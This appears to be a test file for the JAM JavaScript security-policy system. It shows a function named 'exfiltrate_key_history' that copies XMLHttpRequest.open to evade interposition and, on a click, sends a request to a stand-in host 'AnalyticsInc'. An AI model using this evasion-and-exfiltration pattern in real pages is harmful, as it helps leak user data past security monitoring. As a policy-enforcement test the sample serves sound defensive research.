
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
function copy(obj$$16) {
  if (typeof obj$$16 !== "object") {
    return obj$$16;
  } else {
    var value$$27 = obj$$16.valueOf();
    if (obj$$16 != value$$27) {
      return new obj$$16.constructor(value$$27);
    } else {
      if (obj$$16 instanceof obj$$16.constructor && obj$$16.constructor !== Object) {
        var c = clone(obj$$16.constructor.prototype);
        var property;
        for (property in obj$$16) {
          if (obj$$16.hasOwnProperty(property)) {
            c[property] = copy(obj$$16[property]);
          }
        }
      } else {
        c = {};
        for (property in obj$$16) {
          c[property] = copy(obj$$16[property]);
        }
      }
      return c;
    }
  }
}
function Clone() {
}
function clone(obj$$17) {
  Clone.prototype = obj$$17;
  return new Clone;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  xmlhttp.opennew = copy(xmlhttp.open);
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true);
  xmlhttp.send(null);
}
document.getElementById("test").onclick = exfiltrate_key_history

}

JAM.stopProfile('load');
